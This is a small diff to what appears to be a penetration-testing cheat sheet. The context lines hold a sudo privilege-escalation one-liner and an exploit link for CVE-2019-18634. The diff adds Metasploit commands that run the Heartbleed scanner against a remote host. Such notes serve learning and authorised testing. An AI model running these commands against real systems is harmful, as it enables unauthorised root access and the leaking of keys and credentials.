@@ -362,6 +362,13 @@ sudo -u#-1 command
 CVE-2019-18634
 https://github.com/saleemrashid/sudo-cve-2019-18634/blob/master/exploit.c
 
+heartbleed
+msfconsole
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOST
+set verbose true
+run
+
 ```
 
 
